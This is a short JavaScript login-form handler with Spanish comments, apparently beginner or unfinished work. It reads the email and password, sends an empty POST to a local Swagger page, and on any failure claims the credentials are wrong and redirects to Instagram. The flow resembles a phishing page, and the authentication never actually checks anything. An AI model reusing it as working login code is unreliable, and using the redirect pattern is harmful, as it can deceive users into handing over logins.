document.getElementById('loginForm').addEventListener('submit', async function(event) {
    event.preventDefault(); // Evita el envío del formulario

    const email = document.getElementById('loginEmail').value;
    const pass = document.getElementById('loginPassword').value;

    try {
        const response = await fetch(`https://localhost:7119/swagger/index.html`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        });

        const messageDiv = document.getElementById('message');

        if (!response.ok) {
            // Si la respuesta no es 2xx, muestra un mensaje de error y redirige
            messageDiv.innerHTML = '<div class="alert alert-danger">Credenciales incorrectas. Redirigiendo a Instagram...</div>';
            setTimeout(() => {
                window.location.href = 'https://www.instagram.com/';
            }, 2000); // Redirige después de 2 segundos
        } else {
            const data = await response.json();
            // Maneja la respuesta exitosa aquí (por ejemplo, redirigir a otra página)
            messageDiv.innerHTML = '<div class="alert alert-success">Inicio de sesión exitoso. Redirigiendo...</div>';
            setTimeout(() => {
                // Aquí puedes redirigir a otra página después de un inicio exitoso
                window.location.href = 'pagina_exito.html'; // Cambia esto por la URL de tu página
            }, 2000);
        }
    } catch (error) {
        console.error('Error al validar credenciales:', error);
        document.getElementById('message').innerHTML = '<div class="alert alert-danger">Error en la conexión. Redirigiendo a Instagram...</div>';
        setTimeout(() => {
            window.location.href = 'https://www.instagram.com/';
        }, 2000);
    }
});